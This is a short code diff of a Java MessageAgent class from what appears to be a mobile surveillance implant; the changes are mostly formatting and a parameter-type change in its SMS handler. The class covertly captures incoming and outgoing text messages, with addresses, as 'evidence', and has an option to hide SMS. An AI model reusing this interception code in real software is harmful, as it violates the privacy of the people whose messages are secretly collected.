@@ -115,7 +115,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //#endif
 
         mailListener = MailListener.getInstance();
-        
+
         //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
         //#else
@@ -144,8 +144,6 @@ public final class MessageAgent extends Agent implements SmsObserver,
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
     }
-
-
 
     public static MessageAgent getInstance() {
         return (MessageAgent) Status.getInstance()
@@ -452,16 +450,17 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public boolean onNewSms(final byte[] byteMessage, String address,
+    public boolean onNewSms(String message, String address,
             final boolean incoming) {
-        
-        String message =  new String(byteMessage);
+
+        //String message = WChar.getString(byteMessage, false);
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog message: " + message + " address: "+ address+" incoming: "+ incoming);
+        debug.trace("saveLog message: " + message + " address: " + address
+                + " incoming: " + incoming);
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
@@ -479,7 +478,6 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
             String from;
             String to;
-            
 
             // Check if it's actually a sms
 
@@ -537,7 +535,8 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
             // Creating log
             if (message != null) {
-                createEvidence(additionalData, WChar.getBytes(message), EvidenceType.SMS_NEW);
+                createEvidence(additionalData, WChar.getBytes(message),
+                        EvidenceType.SMS_NEW);
                 return false;
             } else {
                 //#ifdef DEBUG
@@ -553,8 +552,6 @@ public final class MessageAgent extends Agent implements SmsObserver,
             return false;
         }
     }
-
-  
 
     private String getMySmsAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
